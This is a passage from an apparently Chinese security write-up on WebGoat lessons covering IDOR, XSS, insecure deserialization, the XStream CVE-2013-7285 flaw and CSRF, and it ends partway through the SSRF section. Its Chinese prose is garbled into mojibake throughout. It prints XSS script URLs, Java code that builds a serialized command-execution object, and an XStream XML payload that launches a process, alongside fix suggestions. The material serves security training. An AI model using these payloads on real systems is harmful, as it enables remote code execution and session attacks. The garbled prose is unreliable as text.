</h2>\n<p>æœåŠ¡å™¨ç«¯å¯¹æ•°æ®çš„è®¿é—®æ§åˆ¶éªŒè¯ä¸å……åˆ†</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-7\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-7\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<p>idorâ€“&gt;IDORViewOtherProfile</p>\n<p>å®‰å…¨ä»£ç å°†ç¡®ä¿åœ¨æ‹†é™¤æ‰€è¯·æ±‚çš„é…ç½®æ–‡ä»¶ä¹‹å‰ç¡®ä¿æœ‰ä¸€ä¸ªæ°´å¹³è®¿é—®æ§åˆ¶æ£€æŸ¥</p>\n<p>ä¾‹å¦‚æ£€æŸ¥ç™»å½•ç”¨æˆ·çš„ session ä¸­çš„ idï¼ˆç”¨æˆ·ä¸å¯æ§ï¼‰æ˜¯å¦å’Œè¯·æ±‚çš„ id ä¸€è‡´</p>\n<p>if(requestedProfile.getUserId().equals(authUserId))</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (userSessionData.getValue(<span class=\"string\">&quot;idor-authenticated-as&quot;</span>).equals(<span class=\"string\">&quot;tom&quot;</span>)) &#123;            <span class=\"comment\">//going to use session auth to view this one            String authUserId = (String) userSessionData.getValue(&quot;idor-authenticated-user-id&quot;);            if (userId != null &amp;&amp; !userId.equals(authUserId)) &#123;                //on the right track                UserProfile requestedProfile = new UserProfile(userId);                // secure code would ensure there was a horizontal access control check prior to dishing up the requested profile                 if (requestedProfile.getUserId().equals(&quot;2342388&quot;)) &#123;                    return success(this).feedback(&quot;idor.view.profile.success&quot;).output(requestedProfile.profileToMap().toString()).build();                &#125; else &#123;                    return failed(this).feedback(&quot;idor.view.profile.close1&quot;).build();                &#125;</span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"yq01.png\" alt=\"\"></p>\n<h1 id=\"xssè·¨ç«™è„šæœ¬\"><a class=\"markdownIt-Anchor\" href=\"#xssè·¨ç«™è„šæœ¬\">#</a> XSS è·¨ç«™è„šæœ¬</h1>\n<h2 id=\"æ¼æ´æè¿°-8\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-8\">#</a> æ¼æ´æè¿°</h2>\n<p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross Site Scriptï¼‰æ˜¯ä¸€ç§å°†æ¶æ„ JavaScript ä»£ç æ’å…¥åˆ°å…¶ä»– Web ç”¨æˆ·é¡µé¢é‡Œæ‰§è¡Œä»¥è¾¾åˆ°æ”»å‡»ç›®çš„çš„æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨çš„åŠ¨æ€å±•ç¤ºæ•°æ®åŠŸèƒ½ï¼Œåœ¨ HTML é¡µé¢é‡ŒåµŒå…¥æ¶æ„ä»£ç ã€‚å½“ç”¨æˆ·æµè§ˆè¯¥é¡µæ—¶ï¼Œè¿™äº›åµŒå…¥åœ¨ HTML ä¸­çš„æ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œç”¨æˆ·æµè§ˆå™¨è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç‰¹æ®Šç›®çš„ï¼Œå¦‚ cookie çªƒå–ã€å¸æˆ·åŠ«æŒã€æ‹’ç»æœåŠ¡æ”»å‡»ç­‰ã€‚</p>\n<p>è·¨ç«™è„šæœ¬æ”»å‡»æœ‰ä»¥ä¸‹æ”»å‡»å½¢å¼ï¼š</p>\n<p>1ã€åå°„å‹è·¨ç«™è„šæœ¬æ”»å‡»</p>\n<p>æ”»å‡»è€…åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦ç­‰æ‰‹æ®µï¼Œå‘é€ä¸€ä¸ª URL é“¾æ¥ç»™ç”¨æˆ·æ‰“å¼€ï¼Œåœ¨ç”¨æˆ·æ‰“å¼€é¡µé¢çš„åŒæ—¶ï¼Œæµè§ˆå™¨ä¼šæ‰§è¡Œé¡µé¢ä¸­åµŒå…¥çš„æ¶æ„è„šæœ¬ã€‚</p>\n<p>2ã€å­˜å‚¨å‹è·¨ç«™è„šæœ¬æ”»å‡»</p>\n<p>æ”»å‡»è€…åˆ©ç”¨åº”ç”¨ç¨‹åºæä¾›çš„å½•å…¥æˆ–ä¿®æ”¹æ•°æ®çš„åŠŸèƒ½ï¼Œå°†æ•°æ®å­˜å‚¨åˆ°æœåŠ¡å™¨æˆ–ç”¨æˆ· cookie ä¸­ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆå±•ç¤ºè¯¥æ•°æ®çš„é¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šæ‰§è¡Œé¡µé¢ä¸­åµŒå…¥çš„æ¶æ„è„šæœ¬ï¼Œæ‰€æœ‰æµè§ˆè€…éƒ½ä¼šå—åˆ°æ”»å‡»ã€‚</p>\n<p>3ã€DOM è·¨ç«™è„šæœ¬æ”»å‡»</p>\n<p>ç”±äº HTML é¡µé¢ä¸­ï¼Œå®šä¹‰äº†ä¸€æ®µ JSï¼Œæ ¹æ®ç”¨æˆ·çš„è¾“å…¥ï¼Œæ˜¾ç¤ºä¸€æ®µ HTML ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è¾“å…¥æ—¶ï¼Œæ’å…¥ä¸€æ®µæ¶æ„è„šæœ¬ï¼Œæœ€ç»ˆå±•ç¤ºæ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚</p>\n<p>DOM è·¨ç«™è„šæœ¬æ”»å‡»å’Œä»¥ä¸Šä¸¤ä¸ªè·¨ç«™è„šæœ¬æ”»å‡»çš„åŒºåˆ«æ˜¯ï¼ŒDOM è·¨ç«™æ˜¯çº¯é¡µé¢è„šæœ¬çš„è¾“å‡ºï¼Œåªæœ‰è§„èŒƒä½¿ç”¨ JavaScriptï¼Œæ‰å¯ä»¥é˜²å¾¡ã€‚</p>\n<h2 id=\"æ¼æ´æˆå› -8\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -8\">#</a> æ¼æ´æˆå› </h2>\n<p>åœ¨ HTML ä¸­å¸¸ç”¨åˆ°å­—ç¬¦å®ä½“ï¼Œå°†å¸¸ç”¨åˆ°çš„å­—ç¬¦å®ä½“æ²¡æœ‰è¿›è¡Œè½¬è¯‘ï¼Œå¯¼è‡´å®Œæ•´çš„æ ‡ç­¾å‡ºç°ï¼Œåœ¨å¯è¾“å…¥çš„æ–‡æœ¬æ¡†ç­‰æŸäº›åŒºåŸŸå†…è¾“å…¥ç‰¹å®šçš„æŸäº›æ ‡ç­¾å¯¼è‡´ä»£ç è¢«æ¶æ„ç¯¡æ”¹ã€‚</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-8\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-8\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<ol>\n<li>\n<p>xssâ€“&gt;CrossSiteScriptingLesson5a</p>\n<p>åå°„å‹ xss</p>\n<p>é¢˜ç›®ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç”¨æˆ·è¾“å…¥çš„å‚æ•° field1ï¼Œå› ä¸ºæ˜¯é¢˜ç›®éœ€æ±‚è¿™é‡ŒåŒ¹é… &quot;.*&lt;script&gt;(console\\.log|alert)\\(.<em>\\);?&lt;\\/script&gt;.</em>&quot; ååœ¨é¡µé¢ä¸Šè¿›è¡Œè¾“å‡º</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Predicate&lt;String&gt; XSS_PATTERN = Pattern.compile(            <span class=\"string\">&quot;.*&lt;script&gt;(console\\\\.log|alert)\\\\(.*\\\\);?&lt;\\\\/script&gt;.*&quot;</span>            , Pattern.CASE_INSENSITIVE).asMatchPredicate();<span class=\"keyword\">if</span> (XSS_PATTERN.test(field1)) &#123;            userSessionData.setValue(<span class=\"string\">&quot;xss-reflected-5a-complete&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);            <span class=\"keyword\">if</span> (field1.toLowerCase().contains(<span class=\"string\">&quot;console.log&quot;</span>)) &#123;                <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;xss-reflected-5a-success-console&quot;</span>).output(cart.toString()).build();            &#125; <span class=\"keyword\">else</span> &#123;                <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;xss-reflected-5a-success-alert&quot;</span>).output(cart.toString()).build();            &#125;        &#125;</span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"xss02.png\" alt=\"\"></p>\n<p>ä¿®å¤å»ºè®®ï¼š</p>\n<ol>\n<li>\n<p>æ ¹æ®è¦åœ¨ä½•å¤„ä½¿ç”¨ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨é€‚å½“çš„è½¬ä¹‰ / ç¼–ç æŠ€æœ¯ï¼šHTML è½¬ä¹‰ï¼ŒJavaScript è½¬ä¹‰ï¼ŒCSS è½¬ä¹‰ï¼ŒURL è½¬ä¹‰ç­‰ã€‚ä½¿ç”¨ç°æœ‰çš„è½¬ä¹‰åº“ï¼Œé™¤éç»å¯¹å¿…è¦ï¼Œå¦åˆ™è¯·ä¸è¦ç¼–å†™è‡ªå·±çš„åº“ã€‚</p>\n</li>\n<li>\n<p>å¦‚æœç”¨æˆ·è¾“å…¥éœ€è¦åŒ…å« HTMLï¼Œåˆ™æ— æ³•å¯¹å…¶è¿›è¡Œè½¬ä¹‰ / ç¼–ç ï¼Œå› ä¸ºå®ƒä¼šç ´åæœ‰æ•ˆçš„æ ‡ç­¾ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·ä½¿ç”¨å—ä¿¡ä»»ä¸”ç»è¿‡éªŒè¯çš„åº“æ¥è§£æå’Œæ¸…é™¤ HTMLã€‚</p>\n</li>\n<li>\n<p>ä¸º cookie è®¾ç½® HttpOnly æ ‡å¿—</p>\n</li>\n<li>\n<p>ä½¿ç”¨å†…å®¹å®‰å…¨ç­–ç•¥</p>\n</li>\n</ol>\n</li>\n<li>\n<p>DOM å‹</p>\n<p>æºç ä¸­ä½¿ç”¨è·¯ç”±ï¼Œè·¯ç”±ä¸­çš„å‚æ•°è€Œæ— éœ€ç¼–ç å¯ä»¥æ‰§è¡Œ WebGoat ä¸­çš„å†…éƒ¨åŠŸèƒ½</p>\n<p><img src=\"xss01.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// something like ... http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E--andMoreGarbageHere// or http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&lt;script&gt;webgoat.customjs.phoneHome();&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>é€šè¿‡ url è§¦å‘è·¯ç”±å†…éƒ¨å‡½æ•°çš„æ‰§è¡Œ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&lt;script&gt;webgoat.customjs.phoneHome();&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"xss03.png\" alt=\"\"></p>\n<p>ä¿®å¤å»ºè®®ï¼šè§„èŒƒä½¿ç”¨ JavaScript</p>\n</li>\n</ol>\n<h1 id=\"ååºåˆ—åŒ–\"><a class=\"markdownIt-Anchor\" href=\"#ååºåˆ—åŒ–\">#</a> ååºåˆ—åŒ–</h1>\n<p>ååºåˆ—åŒ–æ¼æ´å‘¢æ˜¯ä¸€ä¸ªè¯´å¤æ‚ä¹Ÿä¸å¤æ‚ï¼Œè¯´ä¸å¤æ‚ä¹Ÿå¾ˆå¤æ‚çš„é—®é¢˜ï¼Œè¦ç†è§£çš„ç‚¹è¿˜æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œ<a href=\"https://www.cnblogs.com/ssooking/p/5875215.html\">è¿™é‡Œå°±è®²çš„å¾ˆç»†</a></p>\n<p>deserializationâ€“&gt;InsecureDeserializationTask</p>\n<p>æ ¹æ® if (!(o instanceof VulnerableTaskHolder))ï¼Œå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬åºåˆ—åŒ–çš„å®ä¾‹åº”è¯¥æ˜¯ VulnerableTaskHolder</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> (ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(<span class=\"keyword\">new</span> ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) &#123;            before = System.currentTimeMillis();            Object o = ois.readObject();            <span class=\"keyword\">if</span> (!(o <span class=\"keyword\">instanceof</span> VulnerableTaskHolder)) &#123;                <span class=\"keyword\">if</span> (o <span class=\"keyword\">instanceof</span> String) &#123;                    <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;insecure-deserialization.stringobject&quot;</span>).build();                &#125;                <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;insecure-deserialization.wrongobject&quot;</span>).build();            &#125;            after = System.currentTimeMillis();</span><br></pre></td></tr></table></figure>\n<p>VulnerableTaskHolder å®šä½åˆ° Runtime.getRuntime ().exec (taskAction)</p>\n<p>å¹¶ä¸” taskAction æ˜¯åœ¨æ„é€ å‡½æ•°é‡Œè¢«èµ‹å€¼çš„</p>\n<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ taskAction æ¥æ§åˆ¶æ‰§è¡Œçš„å‘½ä»¤ï¼ˆeg. VulnerableTaskHolder go = new VulnerableTaskHolder (â€œsleepâ€, â€œsleep 6â€)ï¼‰ï¼Œå°†å¯¹è±¡ä½¿ç”¨åºåˆ—åŒ–å·¥å…·åºåˆ—åŒ–ï¼Œæäº¤è‡³åç«¯å¤„ç†ï¼Œå°±ä¼šè§¦å‘</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//condition is here to prevent you from destroying the goat altogether\t\tif ((taskAction.startsWith(&quot;sleep&quot;)||taskAction.startsWith(&quot;ping&quot;))\t\t\t\t&amp;&amp; taskAction.length() &lt; 22) &#123;\t\tlog.info(&quot;about to execute: &#123;&#125;&quot;, taskAction);\t\ttry &#123;            Process p = Runtime.getRuntime().exec(taskAction);            BufferedReader in = new BufferedReader(                                new InputStreamReader(p.getInputStream()));            String line = null;            while ((line = in.readLine()) != null) &#123;                log.info(line);            &#125;        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>åºåˆ—åŒ– VulnerableTaskHolder å¯¹è±¡ï¼Œbase64 ç¼–ç </p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;        <span class=\"keyword\">try</span>&#123;            VulnerableTaskHolder go = <span class=\"keyword\">new</span> VulnerableTaskHolder(<span class=\"string\">&quot;sleep&quot;</span>, <span class=\"string\">&quot;sleep 6&quot;</span>);            ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();            ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(bos);            oos.writeObject(go);            oos.flush();            <span class=\"keyword\">byte</span>[] exploit = bos.toByteArray();            String exp = Base64.getEncoder().encodeToString(exploit);            System.out.println(exp);        &#125; <span class=\"keyword\">catch</span> (Exception e)&#123;        &#125;</span><br></pre></td></tr></table></figure>\n<p>æäº¤åååºåˆ—åŒ–åçš„å¯¹è±¡</p>\n<p><img src=\"des01.png\" alt=\"\"></p>\n<p>ä½†æ˜¯æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œè°·æ­Œäº†ä¸€ä¸‹ï¼Œè¯´æ˜¯ç”¨ java è°ƒç”¨ CMD å‘½ä»¤æ—¶ï¼Œéœ€è¦æŒ‡å®š ï¼Œä½†æ˜¯è¿™ä¸ªä¼šæ”¹å˜ç°å­˜ä»£ç é€»è¾‘ï¼Œæš‚æœªå®ç°ï¼Œå®ç°åå†æ›´æ–°</p>\n<p><img src=\"des02.png\" alt=\"\"></p>\n<p>ååºåˆ—åŒ–æ¼æ´ä¿®å¤å»ºè®®ï¼š</p>\n<pre><code>1. å¦‚æœæ˜¯ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå»ºè®®æ›´æ–°ç‰ˆæœ¬æˆ–æ‰“è¡¥ä¸2. åŠ å¼ºå¯¹Runtime.execç›¸å…³ä»£ç çš„æ£€æµ‹3. æ¡ä»¶å…è®¸çš„è¯ï¼Œç¦æ­¢JVMæ‰§è¡Œå¤–éƒ¨å‘½ä»¤\n</code></pre>\n<h1 id=\"ç¬¬ä¸‰æ–¹ç»„ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸‰æ–¹ç»„ä»¶\">#</a> ç¬¬ä¸‰æ–¹ç»„ä»¶</h1>\n<h2 id=\"æ¼æ´æè¿°-9\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-9\">#</a> æ¼æ´æè¿°</h2>\n<p>ç³»ç»Ÿä¸­å¼•ç”¨äº†å­˜åœ¨å·²çŸ¥æ¼æ´çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œå¦‚ Jackson ååºåˆ—åŒ–æ¼æ´ã€Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç­‰ï¼Œå¯èƒ½ä¼šç›´æ¥æˆ–é—´æ¥å¯¼è‡´ç³»ç»Ÿæ²¦é™·ã€‚</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-9\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-9\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<p><a href=\"https://x-stream.github.io/CVE-2013-7285.html\">CVE-2013-7285 æ¼æ´è¯¦æƒ…</a></p>\n<p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰ˆæœ¬ä¿¡æ¯æ‰¾åˆ°ç›¸åº”çš„ cve æ¼æ´å’Œ payload è¿›è¡Œåˆ©ç”¨ï¼Œå¦‚ä¸‹å°±æ˜¯é€šè¿‡æ„é€  ContactImpl çš„ xml æ ¼å¼é€šå…³ã€‚</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> &#123;        \t<span class=\"keyword\">if</span> (!StringUtils.isEmpty(payload)) &#123;        \t\tpayload = payload.replace(<span class=\"string\">&quot;+&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;\\r&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;\\n&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"string\">&quot;&gt;&quot;</span>).replace(<span class=\"string\">&quot; &lt;&quot;</span>, <span class=\"string\">&quot;&lt;&quot;</span>);        \t&#125;            contact = (Contact) xstream.fromXML(payload);        &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;vulnerable-components.close&quot;</span>).output(ex.getMessage()).build();        &#125;                <span class=\"keyword\">try</span> &#123;            <span class=\"keyword\">if</span> (<span class=\"keyword\">null</span>!=contact) &#123;            \tcontact.getFirstName();<span class=\"comment\">//trigger the example like https://x-stream.github.io/CVE-2013-7285.html            &#125;             if (!(contact instanceof ContactImpl)) &#123;            \treturn success(this).feedback(&quot;vulnerable-components.success&quot;).build();            &#125;        &#125; catch (Exception e) &#123;        \treturn success(this).feedback(&quot;vulnerable-components.success&quot;).output(e.getMessage()).build();        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>å®ä¾‹æ¡ˆä¾‹ä¸­ï¼Œå¯ä»¥é€šè¿‡æ„é€  xml æ ¼å¼çš„æ•°æ®ï¼Œé€ æˆ rce</p>\n<p>ç¬¬ä¸‰æ–¹æ¼æ´ä¿®å¤å»ºè®®ï¼šæ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œæˆ–è€…æ‰“è¡¥ä¸</p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>payloadï¼š</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;sorted-set&gt;  &lt;string&gt;foo&lt;/string&gt;  &lt;dynamic-proxy&gt;    &lt;<span class=\"class\"><span class=\"keyword\">interface</span>&gt;<span class=\"title\">java</span>.<span class=\"title\">lang</span>.<span class=\"title\">Comparable</span>&lt;/<span class=\"title\">interface</span>&gt;    &lt;<span class=\"title\">handler</span> <span class=\"title\">class</span></span>=<span class=\"string\">&quot;java.beans.EventHandler&quot;</span>&gt;      &lt;target <span class=\"class\"><span class=\"keyword\">class</span></span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span>&gt;        &lt;command&gt;          &lt;string&gt;cacl.exe&lt;/string&gt;        &lt;/command&gt;      &lt;/target&gt;      &lt;action&gt;start&lt;/action&gt;    &lt;/handler&gt;  &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>\n<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>\n<p><img src=\"301.png\" alt=\"\"></p>\n<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<h2 id=\"æ¼æ´æè¿°-10\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-10\">#</a> æ¼æ´æè¿°</h2>\n<p>CSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸º â€œOne Click Attackâ€ æˆ–è€… Session Ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚å°½ç®¡å¬èµ·æ¥åƒè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ï¼Œä½†å®ƒä¸ XSS éå¸¸ä¸åŒï¼ŒXSS åˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€Œ CSRF åˆ™é€šè¿‡ä¼ªè£…æ¥è‡ªå—ä¿¡ä»»ç”¨æˆ·çš„è¯·æ±‚æ¥åˆ©ç”¨å—ä¿¡ä»»çš„ç½‘ç«™ã€‚ä¸ XSS æ”»å‡»ç›¸æ¯”ï¼ŒCSRF æ”»å‡»å¾€å¾€ä¸å¤§æµè¡Œï¼ˆå› æ­¤å¯¹å…¶è¿›è¡Œé˜²èŒƒçš„èµ„æºä¹Ÿç›¸å½“ç¨€å°‘ï¼‰å’Œéš¾ä»¥é˜²èŒƒï¼Œæ‰€ä»¥è¢«è®¤ä¸ºæ¯” XSS æ›´å…·å±é™©æ€§ã€‚</p>\n<h2 id=\"æ¼æ´æˆå› -9\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -9\">#</a> æ¼æ´æˆå› </h2>\n<p>ç½‘ç«™çš„ cookie åœ¨æµè§ˆå™¨ä¸­ä¸ä¼šè¿‡æœŸï¼Œåªè¦ä¸å…³é—­æµè§ˆå™¨æˆ–è€…é€€å‡ºç™»å½•ï¼Œé‚£ä»¥ååªè¦æ˜¯è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œéƒ½ä¼šé»˜è®¤ä½ å·²ç»ç™»å½•çš„çŠ¶æ€ã€‚è€Œåœ¨è¿™ä¸ªæœŸé—´ï¼Œæ”»å‡»è€…å‘é€äº†æ„é€ å¥½çš„ csrf è„šæœ¬æˆ–åŒ…å« csrf è„šæœ¬çš„é“¾æ¥ï¼Œå¯èƒ½ä¼šæ‰§è¡Œä¸€äº›ç”¨æˆ·ä¸æƒ³åšçš„åŠŸèƒ½</p>\n<h2 id=\"éƒ¨åˆ†ä»£ç åŠä¿®å¤å»ºè®®\"><a class=\"markdownIt-Anchor\" href=\"#éƒ¨åˆ†ä»£ç åŠä¿®å¤å»ºè®®\">#</a> éƒ¨åˆ†ä»£ç åŠä¿®å¤å»ºè®®</h2>\n<ol>\n<li>\n<p>csrfâ€“&gt;ForgedReviews.createNewReview()</p>\n<p>åªåˆ¤æ–­äº† refer å€¼</p>\n<p><img src=\"csrf1.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>bp ä¸€é”®ç”Ÿæˆ</p>\n<p><img src=\"csrf01.png\" alt=\"\"></p>\n<p><img src=\"csrf02.png\" alt=\"\"></p>\n<p>ä¿®å¤å»ºè®®ï¼š</p>\n<ol>\n<li>\n<p>åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆéšæœº tokenï¼Œæµè§ˆå™¨åœ¨å‘èµ·é’ˆå¯¹æ•°æ®çš„ä¿®æ”¹è¯·æ±‚å°† token æäº¤ï¼Œç”±æœåŠ¡å™¨ç«¯éªŒè¯é€šè¿‡å¤Ÿè¿›è¡Œæ“ä½œé€»è¾‘ï¼Œtoken éœ€è¦è‡³å¤šä¸€æ¬¡æœ‰æ•ˆï¼Œå¹¶å…·æœ‰æœ‰é™çš„ç”Ÿå‘½å‘¨æœŸ</p>\n</li>\n<li>\n<p>é€šè¿‡æ£€æŸ¥ refer å€¼ï¼Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦åˆæ³• (ä¸‹é¢çš„ä»£ç å°±æ˜¯å…¸å‹çš„åä¾‹)</p>\n</li>\n<li>\n<p>é’ˆå¯¹éœ€è¦ç”¨æˆ·æˆæƒçš„è¯·æ±‚ï¼Œæç¤ºç”¨æˆ·è¾“å…¥èº«ä»½è®¤è¯åå†ç»§ç»­æ“ä½œ</p>\n</li>\n<li>\n<p>é’ˆå¯¹é¢‘ç¹æ“ä½œæç¤ºè¾“å…¥éªŒè¯ç åå†ç»§ç»­è¿›è¡Œæ“ä½œ</p>\n</li>\n</ol>\n</li>\n<li>\n<p>csrfâ€“&gt;CSRFFeedbackï¼ˆ7ï¼‰</p>\n<p>æ–°å¢åˆ¤æ–­äº† contentTypeã€‚</p>\n<p>æ‹¦æˆªè¯·æ±‚åŒ…ç”Ÿæˆçš„ poc ä¸­ï¼Œenctype=â€œtext/plainâ€ï¼Œæˆ‘ä»¬è¦å‘é€çš„ json æ ¼å¼çš„æ•°æ®éƒ½è¢«éšè—åœ¨ input çš„ name ä¸­ï¼Œå…¶ä½™åŒä¸Š</p>\n<p><img src=\"csrf2.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"csrf03.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h1>\n<h2 id=\"æ¼æ´æè¿°-11\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-11\">#</a> æ¼æ´æè¿°</h2>\n<p>æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼ˆSSRFï¼‰ä¹Ÿæˆä¸ºè·¨ç«™ç‚¹ç«¯å£æ”»å‡»ï¼Œæ˜¯ç”±äºä¸€äº›åº”ç”¨åœ¨ 9 å‘ç¬¬ä¸‰æ–¹ä¸»æœºè¯·æ±‚èµ„æºæ—¶æä¾›äº† URL å¹¶é€šè¿‡ä¼ é€’çš„ URL 